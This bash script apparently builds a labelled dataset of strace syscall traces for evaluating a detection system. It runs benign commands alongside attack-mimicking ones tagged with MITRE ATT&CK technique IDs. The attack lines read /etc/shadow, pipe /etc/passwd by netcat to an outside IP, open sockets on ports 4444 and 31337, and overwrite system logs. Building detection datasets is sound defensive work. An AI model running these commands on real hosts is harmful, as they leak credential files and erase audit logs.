#!/usr/bin/env bash
# capture_real_traces.sh — Capture real Linux syscall traces via strace.
#
# Modes:
#   --docker   Force Docker ubuntu:22.04 (default on macOS)
#   --native   Force host strace (default on Linux when strace is available)
#   --both     Run native (if Linux) then docker supplement
#
# Target: ≥50 benign + ≥50 attack-mimicking traces for IEEE eval (checklist A2).
# Ground-truth sidecars: data/input/real_traces/<label>.label.json

set -euo pipefail

OUT="$(cd "$(dirname "$0")/../.."; pwd)/data/input/real_traces"
mkdir -p "$OUT"

MODE="${CAPTURE_MODE:-auto}"
for arg in "$@"; do
  case "$arg" in
    --docker) MODE=docker ;;
    --native) MODE=native ;;
    --both)   MODE=both ;;
  esac
done

if [[ "$MODE" == "auto" ]]; then
  if [[ "$(uname -s)" == "Linux" ]] && command -v strace &>/dev/null; then
    MODE=native
  else
    MODE=docker
  fi
fi

STRACE_OPTS="-f -tt -T -q -e trace=execve,openat,open,connect,listen,fork,clone,mmap,ptrace,setuid"
IMAGE="ubuntu:22.04"
DOCKER_IMAGE="sentinel-strace"

write_label() {
  local label="$1" gt="$2" cmd="$3" technique="${4:-}" source="${5:-}"
  cat > "$OUT/${label}.label.json" <<LABEL_EOF
{
  "trace": "${label}.log",
  "ground_truth": "${gt}",
  "technique": "${technique}",
  "command": $(python3 -c "import json; print(json.dumps('''$cmd'''))"),
  "label_source": "researcher_at_capture_time",
  "capture_mode": "${source}",
  "label_rationale": "Label assigned from command intent before LLM classification"
}
LABEL_EOF
}

run_trace_native() {
  local label="$1" cmd="$2" gt="$3" technique="${4:-}"
  local outfile="$OUT/${label}.log"
  echo "  [native] $label"
  strace $STRACE_OPTS -o "$outfile" bash -c "$cmd" 2>/dev/null || true
  write_label "$label" "$gt" "$cmd" "$technique" "native_linux_strace"
}

run_trace_docker() {
  local label="$1" cmd="$2" gt="$3" technique="${4:-}"
  local outfile="$OUT/${label}.log"
  echo "  [docker] $label"
  docker run --rm "$DOCKER_IMAGE" bash -c \
    "strace $STRACE_OPTS -o /tmp/t.log $cmd 2>/dev/null; cat /tmp/t.log" \
    > "$outfile" 2>/dev/null || true
  write_label "$label" "$gt" "$cmd" "$technique" "docker_ubuntu_22.04"
}

run_trace() {
  local label="$1" cmd="$2" gt="$3" technique="${4:-}"
  case "$MODE" in
    native) run_trace_native "$@" ;;
    docker) run_trace_docker "$@" ;;
    both)
      run_trace_native "${label}_native" "$cmd" "$gt" "$technique"
      run_trace_docker "${label}_docker" "$cmd" "$gt" "$technique"
      ;;
  esac
}

prepare_docker() {
  echo "Preparing Docker image with strace..."
  docker build -q -t "$DOCKER_IMAGE" - <<'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq strace netcat-openbsd curl python3 2>/dev/null
DOCKERFILE
}

echo "========================================"
echo "SENTINEL Real Syscall Capture"
echo "Mode: $MODE  Platform: $(uname -a)"
echo "Output: $OUT"
echo "========================================"

if [[ "$MODE" == "docker" || "$MODE" == "both" ]]; then
  prepare_docker
fi

# ── Original 15 traces (backward compatible names) ───────────────────────────
echo ""
echo "── Core scenarios (15) ──"
run_trace "benign_cat_hostname"   "cat /etc/hostname" "BENIGN" ""
run_trace "benign_ls_usr"         "ls /usr/bin | head -20" "BENIGN" ""
run_trace "benign_python_json"    'python3 -c "import json; print(json.dumps({\"key\": \"val\"}))"' "BENIGN" ""
run_trace "benign_find_libs"      "find /usr/lib -name '*.so' -maxdepth 2 | head -20" "BENIGN" ""
run_trace "benign_cat_os_release" "cat /etc/os-release" "BENIGN" ""
run_trace "benign_python_math"    'python3 -c "import math; print(math.pi)"' "BENIGN" ""
run_trace "benign_which_bash"     "which bash" "BENIGN" ""

run_trace "attack_T1003_shadow"   "bash -c 'cat /etc/shadow 2>/dev/null; cat /etc/passwd'" "MALICIOUS" "T1003"
run_trace "attack_T1003_T1071"    "bash -c 'cat /etc/passwd > /tmp/.x; nc -w1 -z 10.0.0.1 4444 || true'" "MALICIOUS" "T1003,T1071"
run_trace "attack_T1059_scripted" 'bash -c "python3 -c \"import socket; s=socket.socket(); s.settimeout(1); s.connect((\\\"10.0.0.1\\\", 31337))\" || true"' "MALICIOUS" "T1059"
run_trace "attack_T1068_setuid"   'bash -c "python3 -c \"import os; os.setuid(0)\" 2>/dev/null || true; id"' "MALICIOUS" "T1068"
run_trace "attack_T1055_ptrace"   'bash -c "python3 -c \"import ctypes; ctypes.CDLL(None).ptrace(16, 1, 0, 0)\" 2>/dev/null || true"' "MALICIOUS" "T1055"
run_trace "attack_T1041_exfil"    "bash -c 'cat /etc/passwd /etc/hostname > /tmp/data.txt; nc -w1 34.56.78.90 443 < /tmp/data.txt || true'" "MALICIOUS" "T1041"
run_trace "attack_T1562_evasion"  'bash -c "echo x > /var/log/syslog 2>/dev/null || true"' "MALICIOUS" "T1562"
run_trace "attack_T1078_valid_accts" "bash -c 'nc -l -p 2222 & sleep 0.2; nc -w1 -z 10.10.10.1 4444 || true; wait'" "MALICIOUS" "T1078"

# ── Expanded benign (43 more → 50 total) ─────────────────────────────────────
echo ""
echo "── Expanded benign ──"
BENIGN_CMDS=(
  "pwd"
  "id"
  "whoami"
  "hostname"
  "date"
  "uname -a"
  "env | head -5"
  "df -h /"
  "free -h 2>/dev/null || true"
  "uptime"
  "wc -l /etc/passwd"
  "head -5 /etc/passwd"
  "tail -5 /etc/passwd"
  "grep root /etc/passwd"
  "sort /etc/passwd | head -3"
  "cut -d: -f1 /etc/passwd | head -5"
  "ls -la /tmp | head -10"
  "ls /etc | head -15"
  "file /bin/bash"
  "readlink -f /bin/sh"
  "ss -tln 2>/dev/null || netstat -tln 2>/dev/null || true"
  "ip route 2>/dev/null || true"
  "ping -c 1 127.0.0.1"
  "python3 -c 'import os; print(os.getcwd())'"
  "python3 -c 'import hashlib; print(hashlib.md5(b\"x\").hexdigest())'"
  "python3 -c 'import glob; print(len(glob.glob(\"/usr/bin/*\")))'"
  "python3 -c 'import subprocess; subprocess.run([\"ls\", \"-la\", \"/\"], check=False)'"
  "cat /etc/hosts"
  "cat /proc/version"
  "ls /proc/self/fd | head -5"
  "tr 'a-z' 'A-Z' <<< hello"
  "echo test | wc -c"
  "du -sh /usr 2>/dev/null | head -1 || du -sh / 2>/dev/null | head -1"
  "dpkg -l 2>/dev/null | head -5 || true"
  "apt-get -qq update 2>/dev/null || true"
  "curl -s --max-time 2 http://127.0.0.1:1/ || true"
  "wget -q -O /dev/null --timeout=2 http://example.com 2>/dev/null || true"
  "find /etc -maxdepth 1 -type f | head -5"
  "stat /bin/ls"
  "lsattr /etc/passwd 2>/dev/null || true"
  "getent passwd | head -3"
  "locale"
  "python3 -m json.tool <<< '{\"a\":1}'"
)

i=1
for cmd in "${BENIGN_CMDS[@]}"; do
  lbl=$(printf "benign_ext_%03d" "$i")
  run_trace "$lbl" "$cmd" "BENIGN" ""
  i=$((i + 1))
done

# ── Expanded attack (42 more → 50 total) ─────────────────────────────────────
echo ""
echo "── Expanded attack-mimicking ──"
for n in $(seq 1 42); do
  oct=$((n % 200 + 1))
  port=$((4000 + n))
  lbl=$(printf "attack_ext_%03d" "$n")
  case $((n % 7)) in
    0) run_trace "$lbl" "bash -c 'cat /etc/shadow 2>/dev/null; nc -w1 -z 10.0.${oct}.${n} ${port} || true'" "MALICIOUS" "T1003,T1071" ;;
    1) run_trace "$lbl" "bash -c 'cat /etc/passwd > /tmp/.cache${n}; nc -w1 34.${oct}.${n}.1 443 || true'" "MALICIOUS" "T1041" ;;
    2) run_trace "$lbl" 'bash -c "python3 -c \"import os; os.setuid(0)\" 2>/dev/null; nc -w1 -z 185.${oct}.${n} 4444 || true"' "MALICIOUS" "T1068" ;;
    3) run_trace "$lbl" 'bash -c "python3 -c \"import ctypes; ctypes.CDLL(None).ptrace(16,0,0,0)\" 2>/dev/null || true"' "MALICIOUS" "T1055" ;;
    4) run_trace "$lbl" "bash -c 'echo x > /var/log/auth.log 2>/dev/null || true'" "MALICIOUS" "T1562" ;;
    5) run_trace "$lbl" "bash -c 'nc -l -p $((8000+n)) & sleep 0.1; nc -w1 10.${oct}.${n}.5 8080 || true; wait'" "MALICIOUS" "T1078" ;;
    6) run_trace "$lbl" "bash -c \"python3 -c \\\"import socket; s=socket.socket(); s.settimeout(1); s.connect(('10.0.${oct}.${n}', 31337))\\\" 2>/dev/null || true\"" "MALICIOUS" "T1059" ;;
  esac
done

echo ""
echo "========================================"
echo "Capture complete."
count=$(ls -1 "$OUT"/*.log 2>/dev/null | wc -l | tr -d ' ')
benign=$(grep -l '"ground_truth": "BENIGN"' "$OUT"/*.label.json 2>/dev/null | wc -l | tr -d ' ')
attack=$(grep -l '"ground_truth": "MALICIOUS"' "$OUT"/*.label.json 2>/dev/null | wc -l | tr -d ' ')
echo "  Total .log files: $count"
echo "  Benign labels:    $benign"
echo "  Attack labels:    $attack"
echo "  Directory:        $OUT"
echo "========================================"
